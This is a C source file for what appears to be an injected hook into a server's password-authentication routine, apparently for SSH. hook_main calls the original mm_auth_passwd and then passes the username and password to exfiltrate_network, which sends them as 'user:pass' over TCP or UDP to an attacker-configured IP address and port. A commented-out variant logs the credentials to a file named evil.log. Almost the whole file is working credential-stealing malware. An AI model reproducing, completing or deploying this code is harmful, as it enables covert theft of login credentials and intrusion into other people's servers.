#pragma GCC visibility push(protected)
#include "syscall.h"
#include "config.h"
#include "util.h"

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define NET_TYPE_TCP 1
#define NET_TYPE_UDP 2

extern void *hook_context;

typedef int (*f_auth_passwd)(void *authctx, char *pass);

typedef struct {
	config_block *config_memory;
	f_auth_passwd mm_auth_passwd;
} hook_ctx;

void exfiltrate_network(int net_type, char *username, char *password) {
	char packet[128];

	hook_ctx *ctx = (hook_ctx*)(&hook_context);

	if (_strlen(username) + _strlen(password) + 4 > 128) {
		return;
	}

	struct sockaddr_in servaddr;
	struct sockaddr* p_servaddr = (struct sockaddr*)&servaddr;
	int sockfd;

	switch(net_type) {
		case NET_TYPE_TCP:
			sockfd = _socket(AF_INET, SOCK_STREAM, 0);
		break;

		case NET_TYPE_UDP:
			sockfd = _socket(AF_INET, SOCK_DGRAM, 0);
		break;

		default: return; // invalid NET_TYPE
	}

	_memset((unsigned char*)&servaddr, 0, sizeof(servaddr));

	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = ctx->config_memory->ip_addr;
	servaddr.sin_port = ctx->config_memory->port & 0xffff;

	_memset(packet, 0, 128);

	_strcpy(packet, username);
	_strcat(packet, ":");
	_strcat(packet, password);
	_strcat(packet, "\n");

	switch(net_type) {
		case NET_TYPE_TCP:
			if(_connect(sockfd, p_servaddr, sizeof(servaddr)) == 0) {
				_write(sockfd, packet, _strlen(packet));
				_close(sockfd);
			}
		break;

		case NET_TYPE_UDP:
			_sendto(sockfd, packet, _strlen(packet), 0, p_servaddr, sizeof(servaddr));
		break;
	}
}

/*
void exfiltrate_file() {
	int fd=0;
	if((fd = _open("./evil.log", 0x442, 0666)) == -1) {
		_write(1, "open file failed :(\n", 20);
		_exit(1);
	}

	_write(fd, *(char **)(authctx + 0x20), _strlen(*(char**)(authctx + 0x20)));
	_write(fd, ":", 1);
	_write(fd, password, _strlen(password));
	_write(fd, "\n", 1);
	_close(fd);
}
*/

int hook_main(void *authctx, char *password) {
	hook_ctx *ctx = (hook_ctx*)(&hook_context);
	char *username = *(char **)(authctx + 0x20);
	int result;

	result = ctx->mm_auth_passwd(authctx, password);

	if (ctx->config_memory->net_type != 0) {
		if (!ctx->config_memory->only_log_valid || result) {
			exfiltrate_network(ctx->config_memory->net_type, username, password);
		}
	}

	return result;
}
